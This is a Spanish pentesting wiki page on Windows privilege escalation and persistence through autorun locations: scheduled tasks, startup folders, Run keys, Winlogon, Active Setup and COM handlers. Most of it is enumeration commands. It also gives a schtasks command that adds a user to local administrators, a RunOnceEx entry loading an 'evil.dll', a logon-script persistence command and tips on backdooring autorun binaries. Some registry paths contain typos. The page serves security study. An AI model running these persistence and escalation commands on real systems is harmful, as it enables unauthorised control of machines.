# Escalada de privilegios con Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** se puede usar para ejecutar programas al **inicio**. Comprueba qué binarios están programados para ejecutarse al inicio con:

```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

## Tareas programadas

Las **tareas** se pueden programar para ejecutarse con una **frecuencia específica**. Usa los siguientes comandos para ver qué binarios están programados para ejecutarse:

```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Requires an elevated caller to register a task as SYSTEM
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```

Una tarea creada con `/sc ONLOGON /rl HIGHEST` solicita el nivel de ejecución más alto **disponible para su principal registrado**; el modificador por sí solo no cambia ese principal ni omite UAC. Un proceso con pocos privilegios no puede registrar una tarea con el nivel de ejecución más alto ni elegir SYSTEM como identidad de la tarea. Considera el ejemplo anterior como una acción para un proceso que ya está elevado, no como una vía para pasar de un usuario estándar a SYSTEM.<sup>[[8]](#references)</sup>

Conviene revisar una tarea habilitada que se ejecuta como SYSTEM, incluso cuando su definición y el archivo de acción están protegidos. [El Programador de tareas requiere permiso de ejecución sobre la tarea para iniciarla a petición](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks). Si un usuario con pocos privilegios tiene ese permiso, inspecciona la acción exacta, especialmente los scripts de PowerShell que modifican ACLs de Active Directory o restablecen la configuración de protección de cuentas. Comprueba el ajuste `AllowDemandStart` de la tarea y verifica las entradas y los efectos del script; el permiso para iniciar una tarea fija por sí solo no implica ejecución de código arbitrario.

## Carpetas

Todos los binarios ubicados en las **carpetas de inicio se ejecutan al iniciar el sistema**. Las carpetas de inicio comunes son las que se enumeran a continuación, pero la carpeta de inicio se indica en el registro. [Lee esto para saber dónde.](privilege-escalation-with-autorun-binaries.md#startup-path)

```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```

La entrada Startup de un usuario con más privilegios puede iniciar un script protegido que abre repetidamente archivos de un directorio en el que otro usuario puede escribir. Revisa la **identidad de inicio de sesión real** de la entrada, el directorio de entrada del script y sus ACL, y la acción exacta antes de considerar ese directorio una vía de escalada. En particular, [`hh.exe` abre archivos HTML Help compilados (`.chm`)](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/about-the-html-help-executable-program); un script que le pasa archivos proporcionados por quien lo ejecuta cruza un límite de confianza del contenido, aunque compruebe el nombre del archivo o los primeros bytes. [Las directivas de HTML Help pueden restringir los accesos directos ejecutables](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/system-policies-for-shortcut-and-winhelp-commands), así que confirma la directiva instalada y el comportamiento del contenido accesible. La extensión `.chm` o los bytes mágicos, por sí solos, no demuestran la ejecución de código con privilegios superiores. Inspecciona la ejecución automática, la línea de comandos del proceso y los permisos de la ruta sin abrir el archivo no confiable durante la enumeración.

El mismo límite de confianza del contenido existe cuando una persona con más privilegios **abre manualmente** un `.chm` desde una carpeta de documentación que otro usuario puede reemplazar. Confirma los permisos de escritura del archivo exacto y del directorio padre, la identidad real del visor y el evento de apertura, así como la directiva efectiva de HTML Help. Una carpeta en la que se puede escribir o una solicitud para revisar documentación no demuestra que la identidad con más privilegios haya abierto contenido controlado por un atacante.

> **Dato**: Las vulnerabilidades de *path traversal* durante la extracción de archivos (como la explotada en WinRAR anterior a la versión 7.13 – CVE-2025-8088) pueden aprovecharse para **depositar cargas útiles directamente en estas carpetas Startup durante la descompresión**, lo que provoca la ejecución de código en el siguiente inicio de sesión del usuario. Para profundizar en esta técnica, consulta:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registro

> [!TIP]
> [Nota desde aquí](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): La entrada del registro **Wow6432Node** indica que estás usando una versión de Windows de 64 bits. El sistema operativo usa esta clave para mostrar una vista independiente de HKEY_LOCAL_MACHINE\SOFTWARE a las aplicaciones de 32 bits que se ejecutan en versiones de Windows de 64 bits.

### Ejecuciones

Claves de registro de AutoRun **más conocidas**:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Las claves del registro conocidas como **Run** y **RunOnce** están diseñadas para ejecutar programas automáticamente cada vez que un usuario inicia sesión en el sistema. La línea de comandos asignada como valor de datos de una clave está limitada a 260 caracteres o menos.<sup>[[2]](#references)</sup>

**Ejecuciones de servicios** (pueden controlar el inicio automático de servicios durante el arranque):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

En Windows Vista y versiones posteriores, las claves del registro **Run** y **RunOnce** no se generan automáticamente. Las entradas de estas claves pueden iniciar programas directamente o especificarlos como dependencias. Por ejemplo, para cargar un archivo DLL al iniciar sesión, se podría usar la clave del registro **RunOnceEx** junto con una clave «Depend». Esto se demuestra añadiendo una entrada del registro para ejecutar «C:\temp\evil.dll» durante el inicio del sistema:<sup>[[2]](#references)</sup>

```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```

> [!TIP]
> **Exploit 1**: Si puedes escribir en cualquiera de las claves del registro mencionadas dentro de **HKLM**, puedes escalar privilegios cuando otro usuario inicie sesión.

> [!TIP]
> **Exploit 2**: Si puedes sobrescribir cualquiera de los binarios indicados en las claves del registro de **HKLM**, puedes modificar ese binario con un backdoor cuando otro usuario inicie sesión y escalar privilegios.

```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```

### Ruta de inicio

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Los accesos directos colocados en la carpeta **Startup** activarán automáticamente servicios o aplicaciones durante el inicio de sesión del usuario o el reinicio del sistema. La ubicación de la carpeta **Startup** se define en el registro, tanto para los ámbitos **Local Machine** como **Current User**. Esto significa que cualquier acceso directo agregado a estas ubicaciones de **Startup** hará que el servicio o programa vinculado se inicie después del proceso de inicio de sesión o reinicio, lo que lo convierte en un método sencillo para programar la ejecución automática de programas.<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> Si puedes sobrescribir cualquier Shell Folder de [User] bajo **HKLM**, podrás apuntarla a una carpeta que controles y colocar una backdoor que se ejecutará cada vez que un usuario inicie sesión en el sistema, escalando privilegios.

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```

### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Este valor del registro por usuario puede apuntar a un script o comando que se ejecuta cuando ese usuario inicia sesión. Es principalmente un primitivo de **persistence**, ya que solo se ejecuta en el contexto del usuario afectado, pero aun así conviene revisarlo durante las revisiones de post-explotación y autoruns.<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Si puedes escribir este valor para el usuario actual, puedes volver a activar la ejecución en el siguiente inicio de sesión interactivo sin necesitar derechos de administrador. Si puedes escribirlo en el hive de otro usuario, puedes obtener ejecución de código cuando ese usuario inicie sesión.

```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```

Notas:

- Prefiere rutas completas a archivos `.bat`, `.cmd`, `.ps1` u otros archivos de inicio que ya sean legibles para el usuario objetivo.
- Esto persiste tras cerrar sesión o reiniciar hasta que se elimine el valor.
- A diferencia de `HKLM\...\Run`, esto **no** otorga elevación por sí solo; es persistencia en el ámbito del usuario.

### Claves de Winlogon

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Normalmente, la clave **Userinit** está configurada como **userinit.exe**. Sin embargo, si se modifica esta clave, **Winlogon** también iniciará el ejecutable especificado cuando el usuario inicie sesión. De forma similar, la clave **Shell** debería apuntar a **explorer.exe**, que es el shell predeterminado de Windows.<sup>[[1]](#references)</sup>

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```

> [!TIP]
> Si puedes sobrescribir el valor del registro o el binario, podrás escalar privilegios.

### Configuración de directivas

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Comprueba la clave **Run**.

```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```

### AlternateShell

### Cambiar el símbolo del sistema del modo seguro

En el Registro de Windows, en `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, hay un valor **`AlternateShell`** establecido de forma predeterminada en `cmd.exe`. Esto significa que, al elegir «Modo seguro con símbolo del sistema» durante el inicio (presionando F8), se usa `cmd.exe`. Sin embargo, es posible configurar el equipo para que se inicie automáticamente en este modo sin tener que presionar F8 y seleccionarlo manualmente.

Pasos para crear una opción de arranque que inicie automáticamente en «Modo seguro con símbolo del sistema»:<sup>[[5]](#references)</sup>

1. Cambia los atributos del archivo `boot.ini` para quitar las marcas de solo lectura, sistema y oculto: `attrib c:\boot.ini -r -s -h`
2. Abre `boot.ini` para editarlo.
3. Inserta una línea como esta: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Guarda los cambios en `boot.ini`.
5. Vuelve a aplicar los atributos originales del archivo: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Cambiar la clave del Registro **AlternateShell** permite configurar un shell de comandos personalizado, lo que podría facilitar el acceso no autorizado.
- **Exploit 2 (permisos de escritura en PATH):** Tener permisos de escritura en cualquier parte de la variable del sistema **PATH**, especialmente antes de `C:\Windows\system32`, permite ejecutar un `cmd.exe` personalizado, que podría actuar como puerta trasera si el sistema se inicia en modo seguro.
- **Exploit 3 (permisos de escritura en PATH y boot.ini):** Tener acceso de escritura a `boot.ini` permite iniciar automáticamente en modo seguro, lo que facilita el acceso no autorizado en el siguiente reinicio.

Para comprobar la configuración actual de **AlternateShell**, usa estos comandos:

```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```

### Componente instalado

Active Setup es una característica de Windows que **se inicia antes de que el entorno de escritorio termine de cargarse**. Prioriza la ejecución de ciertos comandos, que deben completarse antes de que continúe el inicio de sesión del usuario. Este proceso ocurre incluso antes de que se activen otras entradas de inicio, como las de las secciones Run o RunOnce del registro.

Active Setup se administra mediante las siguientes claves del registro:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Dentro de estas claves hay varias subclaves, cada una correspondiente a un componente específico. Entre los valores de clave de especial interés están:

- **IsInstalled:**
  - `0` indica que el comando del componente no se ejecutará.
  - `1` significa que el comando se ejecutará una vez por cada usuario. Este es el comportamiento predeterminado si falta el valor `IsInstalled`.
- **StubPath:** Define el comando que ejecutará Active Setup. Puede ser cualquier línea de comandos válida, como iniciar `notepad`.

**Información de seguridad:**

- Modificar o escribir en una clave donde **`IsInstalled`** tenga el valor `"1"` y haya un **`StubPath`** específico puede permitir la ejecución no autorizada de comandos, lo que podría facilitar una escalada de privilegios.
- Modificar el archivo binario al que se hace referencia en cualquier valor **`StubPath`** también podría permitir una escalada de privilegios, si se cuenta con permisos suficientes.

Para inspeccionar las configuraciones de **`StubPath`** en los componentes de Active Setup, se pueden usar estos comandos:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```

### Objetos auxiliares del navegador

### Descripción general de los objetos auxiliares del navegador (BHO)

Los objetos auxiliares del navegador (BHO) son módulos DLL que añaden funciones a Microsoft Internet Explorer. Se cargan en Internet Explorer y Windows Explorer cada vez que se inician. Sin embargo, su ejecución puede bloquearse estableciendo la clave **NoExplorer** en 1, lo que impide que se carguen con las instancias de Windows Explorer.<sup>[[1]](#references)</sup>

Los BHO son compatibles con Windows 10 a través de Internet Explorer 11, pero no son compatibles con Microsoft Edge, el navegador predeterminado en las versiones más recientes de Windows.

Para explorar los BHO registrados en un sistema, puedes inspeccionar las siguientes claves del registro:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Cada BHO está representado en el registro por su **CLSID**, que sirve como identificador único. Puedes encontrar información detallada sobre cada CLSID en `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Para consultar los BHO en el registro, puedes utilizar estos comandos:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```

### Extensiones de Internet Explorer

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Ten en cuenta que el registro contendrá una nueva entrada por cada DLL, representada por el **CLSID**. Puedes encontrar la información del CLSID en `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Controladores de fuentes

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```

### Comando de apertura

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`

```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```

### Controladores COM del menú contextual

Los controladores del menú contextual de Explorer son extensiones del shell registradas en claves como `HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers` y `HKLM\SOFTWARE\Classes\Folder\shellex\ContextMenuHandlers`. El valor predeterminado de un controlador, o a veces el nombre de su clave, es un CLSID. Sigue ese CLSID hasta `HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32`; su valor predeterminado indica la DLL que se carga cuando se invoca el controlador.

```powershell
reg query "HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers" /s
reg query "HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32" /ve
Get-Acl 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32' |
  Select-Object -ExpandProperty Access
```

Comprueba las vistas del registro de 32 y 64 bits. `HKCR` combina los registros de clases del usuario y de todo el equipo, así que verifica qué clave subyacente resolverá un proceso. Una identidad con pocos privilegios que pueda modificar un valor `InprocServer32` de todo el equipo puede redirigir un proceso con más privilegios a otra DLL, pero la escalada requiere que ese proceso invoque el controlador. Una ruta de DLL con permisos de escritura puede generar un riesgo similar, incluso si el valor del registro está protegido.

### Image File Execution Options

```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```

## SysInternals

Ten en cuenta que todos los sitios donde puedes encontrar autoruns ya son analizados por [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Sin embargo, para obtener una lista más completa de archivos que se ejecutan automáticamente, puedes usar [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) de Sysinternals:

```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```

## Más

**Encuentra más Autoruns, como registros, en** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)<sup>[[4]](#references)</sup>

## References

- [1] [Mecanismos comunes de persistencia de malware](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Ejecución de inicio automático al arrancar o iniciar sesión: claves de ejecución del registro / carpeta de inicio](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Scripts de inicialización al arrancar o iniciar sesión: script de inicio de sesión (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Categorías de inicio automático (Solución de problemas con las herramientas de Windows Sysinternals, 2.ª edición)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [¿Cómo puedo agregar una opción de arranque que inicie un shell alternativo?](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Resumen de Metasploit del 04/03/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [PR de Metasploit #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)
- [8] [Microsoft Learn – Contextos de seguridad para tareas](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)
{{#include ../../banners/hacktricks-training.md}}
